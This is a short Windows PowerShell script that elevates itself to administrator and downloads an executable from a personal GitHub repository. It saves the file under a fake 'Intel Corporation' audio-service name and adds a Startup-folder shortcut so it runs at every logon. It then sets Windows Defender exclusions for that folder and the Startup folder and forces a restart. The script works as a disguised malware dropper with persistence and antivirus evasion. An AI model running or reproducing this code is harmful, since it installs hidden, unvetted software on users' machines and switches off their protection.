clear
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
       $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
       Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
       Exit
      }
     }
     
     # Remainder of script here


      $WScriptShell = New-Object -ComObject WScript.Shell
      $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
      $ShortcutFile = "$FolderPath\IAAudIOSvc.lnk"
      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"
      
      If(!(Test-Path $FolderPath)) {
          New-Item -ItemType Directory -Force -Path $FolderPath
      }

      Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/IAAudIOSvc.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"  
      
      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = $TargetFile
      $Shortcut.Arguments = ""
      $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc"
      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe,0"
      $Shortcut.Save()

      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\"
      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" 
      Restart-Computer -Force
